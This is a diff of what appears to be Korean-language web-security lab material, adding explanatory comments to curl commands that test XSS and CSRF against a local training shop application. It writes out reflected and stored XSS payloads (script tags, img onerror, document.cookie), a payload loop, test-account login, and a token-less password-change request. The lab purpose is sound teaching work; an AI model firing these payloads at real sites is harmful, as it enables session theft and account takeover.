@@ -137,10 +137,10 @@ URL: http://site.com/search?q=<script>alert(1)</script>
 ```bash
 # 검색 기능에 XSS 페이로드 삽입
 # 서버 응답에 스크립트가 그대로 포함되는지 확인
-curl -s "http://10.20.30.80:3000/rest/products/search?q=<script>alert(1)</script>" | grep -o "<script>alert(1)</script>" && echo "XSS 반사됨!" || echo "필터링됨"
+curl -s "http://10.20.30.80:3000/rest/products/search?q=<script>alert(1)</script>" | grep -o "<script>alert(1)</script>" && echo "XSS 반사됨!" || echo "필터링됨"  # silent 모드 / 파일 저장
 
 # URL 인코딩 버전
-curl -s "http://10.20.30.80:3000/rest/products/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E" | head -5
+curl -s "http://10.20.30.80:3000/rest/products/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E" | head -5  # silent 모드
 
 # 다양한 페이로드 테스트
 PAYLOADS=(
@@ -151,7 +151,7 @@ PAYLOADS=(
   "'-alert(1)-'"
 )
 
-for payload in "${PAYLOADS[@]}"; do
+for payload in "${PAYLOADS[@]}"; do                    # 반복문 시작
   encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
   result=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=$encoded")
   if echo "$result" | grep -q "alert(1)"; then
@@ -194,13 +194,13 @@ curl -s http://10.20.30.80:3000 | grep -c "sanitize\|DomSanitizer\|innerHtml"
 # 먼저 로그인
 TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
+  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)  # 요청 데이터(body)
 
 # 피드백에 XSS 페이로드 삽입
 curl -s -X POST http://10.20.30.80:3000/api/Feedbacks/ \
   -H "Content-Type: application/json" \
   -H "Authorization: Bearer $TOKEN" \
-  -d '{
+  -d '{                                                # 요청 데이터(body)
     "comment": "좋은 서비스입니다 <script>alert(document.cookie)</script>",
     "rating": 5,
     "captchaId": 0,
@@ -208,10 +208,10 @@ curl -s -X POST http://10.20.30.80:3000/api/Feedbacks/ \
   }' | python3 -m json.tool 2>/dev/null
 
 # 저장된 피드백 조회 - XSS 페이로드가 그대로 나오는지 확인
-curl -s http://10.20.30.80:3000/api/Feedbacks/ | python3 -c "
+curl -s http://10.20.30.80:3000/api/Feedbacks/ | python3 -c "  # silent 모드
 import sys, json
 data = json.load(sys.stdin).get('data', [])
-for fb in data[-3:]:
+for fb in data[-3:]:                                   # 반복문 시작
     comment = fb.get('comment', '')
     if '<script>' in comment or 'onerror' in comment:
         print(f'[XSS 발견] ID:{fb.get(\"id\")}, Comment: {comment[:100]}')
@@ -226,7 +226,7 @@ for fb in data[-3:]:
 # 사용자 프로필 이름에 XSS
 curl -s -X POST http://10.20.30.80:3000/api/Users/ \
   -H "Content-Type: application/json" \
-  -d '{
+  -d '{                                                # 요청 데이터(body)
     "email": "xss<img src=x onerror=alert(1)>@test.com",
     "password": "Test1234!",
     "passwordRepeat": "Test1234!",
@@ -238,13 +238,13 @@ curl -s -X POST http://10.20.30.80:3000/api/Users/ \
 curl -s -X PUT http://10.20.30.80:3000/rest/products/1/reviews \
   -H "Content-Type: application/json" \
   -H "Authorization: Bearer $TOKEN" \
-  -d '{
+  -d '{                                                # 요청 데이터(body)
     "message": "훌륭한 제품! <img src=x onerror=alert(document.domain)>",
     "author": "student@test.com"
   }' 2>/dev/null
 
 # 저장된 리뷰 확인
-curl -s http://10.20.30.80:3000/rest/products/1/reviews | python3 -m json.tool 2>/dev/null | head -20
+curl -s http://10.20.30.80:3000/rest/products/1/reviews | python3 -m json.tool 2>/dev/null | head -20  # silent 모드
 ```
 
 ---
@@ -361,12 +361,12 @@ curl -sI http://10.20.30.80:3000 | grep -i "set-cookie" | grep -i "samesite" || 
 # CSRF 토큰 없이 상태 변경 요청이 성공하는지 확인
 TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
+  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)  # 요청 데이터(body)
 
 # 비밀번호 변경 시도 (CSRF 토큰 없이)
 curl -s "http://10.20.30.80:3000/rest/user/change-password?current=Test1234!&new=NewPass123!&repeat=NewPass123!" \
   -H "Authorization: Bearer $TOKEN" \
-  -H "Cookie: token=$TOKEN" | python3 -m json.tool 2>/dev/null
+  -H "Cookie: token=$TOKEN" | python3 -m json.tool 2>/dev/null  # 쿠키 전송
 
 # GET 메서드로 상태 변경이 가능하면 CSRF에 매우 취약
 ```
